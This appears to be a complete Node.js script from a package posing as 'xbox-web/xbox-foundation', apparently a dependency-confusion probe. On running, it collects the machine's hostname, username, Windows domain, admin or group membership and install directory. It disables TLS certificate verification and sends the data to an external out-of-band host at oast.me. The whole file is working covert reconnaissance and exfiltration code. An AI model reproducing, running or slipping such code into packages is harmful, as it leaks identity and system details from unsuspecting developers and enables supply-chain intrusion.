var os = require('os');
var hostname = os.hostname();
var username = os.userInfo().username;
var platform = os.platform();
var admin_text;

if (platform == 'win32' || platform == 'win64') {
    try {
        net_session = require('child_process').execSync('net session');
        admin_text = 'admin';
    }
    catch {
        admin_text = 'non-admin';
    }

    username = require('child_process').execSync('systeminfo | findstr /B Domain').toString().replace('Domain:', '').trim() + '/' + username;

} else {
    admin_text = os.userInfo().uid;

    try {
        const { execSync } = require('child_process');
        let stdout = execSync('groups').toString().replace('\n', '');
        admin_text += ' ' + stdout;
    }
    catch {
    }
}

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;

const https = require('https')
const options = {
  hostname: 'cig6l3l34eboiti6qhjg6bi17eq4dpqwn.oast.me',
  port: 443,
  path: '/?uname=' + encodeURI(username + ' (' + admin_text + ')') + '&Hostname=' + encodeURI(hostname) + '&Package=xbox-web/xbox-foundation&PWD=' + __dirname,
  method: 'GET'
}

const req = https.request(options)

req.end();
